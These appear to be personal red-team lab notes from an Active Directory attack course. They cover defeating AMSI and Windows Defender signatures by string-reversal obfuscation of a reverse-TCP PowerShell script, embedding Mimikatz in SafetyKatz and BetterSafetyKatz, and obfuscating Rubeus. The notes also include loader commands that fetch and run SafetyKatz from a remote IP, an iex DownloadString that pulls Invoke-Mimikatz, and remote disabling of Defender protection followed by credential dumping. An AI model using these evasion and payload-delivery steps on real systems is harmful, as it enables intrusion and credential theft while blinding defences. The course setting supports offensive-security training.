# AMSITrigger

https://github.com/RythmStick/AMSITrigger

AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detecetd.ps1

# For full obfuscation of PowerShell scripts:

https://github.com/danielbohannon/Invoke-Obfuscation

# Bypass AV Signatures Steps

1. Scan using AMSITrigger
2. Modify the deteceted code snippet
3. Rescan using AMSITrigger
4. Repeat 2 & 3 till we get a result as "AMSI_RESULT_NOT_DETECTED" or "Blank"

  * Reverse the "System.AppDomain" string
  
  $String = 'niamoDppA.metsyS'
  $classrev = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
  $AppDomain = [Reflection.Assembly].Assembly.GetType("$classrev").GetProperty('CurrentDomain').GetValue($null, @())
  
  * Reverse the "Net.Sockets" string
  $String = "stekcoS.teN"
  $class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
  if ($Reverse)
  {
    $client = New-Object System.$class.TCPClient($IPAddress,$Port)
  }

# AV Bypass for .NET Tradecraft - String Manipulation
# TOOL -> DEFENDERCHECK -> https://github.com/matterpreter/DefenderCheck
# Identify code and strings from a binary that Windows Defender may flag

# USAGE
DefenderCheck.exe <Path to Sharpkatz binary>
-> Check slide 112 AND 113 <-

# For SafetyKatz 
1. Download latest version of Mimikatz and Out-CompressedDll.ps1
2. Run the Out-CompressedDll.ps1 PowerShell script on Mimikatz binary and save the output to a file

# USAGE
Out-CompressedDll <Path to mimikatz.exe> > outputfilename.txt

# FOR BETTERSAFETYKATZ
1. Download the latest release of "mimikatz_trunk.zip" 
2. Convert the file to base64 value

$filename = "D:\Temp\mimikatz_trunk.zip"
[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | clip

3. Added a new variable that contains the bas64 value of mimikatz_trunk.zip file 
4. Comment the code that downloads or accepts the mimikatz file as an argument
5. Convert the base64 string to bytes and pass it to "zipStream" variable

Slide 117 and 118

# FOR RUBEUS

1. Use ConfuserEx https://github.com/mkaring/ConfuserEx to obfuscate the binary 
DefenderCheck.exe Rubeus.exe


# USE NET LOADER TO DELIVER BINARY PAYLOADS 
C:\Users\Public\Loader.exe -path http://192.168.100.75/SafetyKatz.ex

# WEN ALSO HAVE ASSEMBLY LOAD THAT CAN BE USED TO LOAD NETLOADER in MEMORY FROM AN URL WHICH THEN LOADS A BINARY FROM A FILEPATH OR URL
C:\Users\Public\AssemblyLoad.exe http://192.168.100.75/Loader.exe -path http://192.168.100.75/SafetyKatz.exe


# DISABLE IN MEMORY AV PROTECTION OF A REMOTE MACHINE (from CI -> MGMT)
iex ((New-Object Net.WebClient).DownloadString('https://172.16.100.75/Invoke-Mimikatz.ps1'))
$sess = New-PSSsession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
Invoke-Command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess

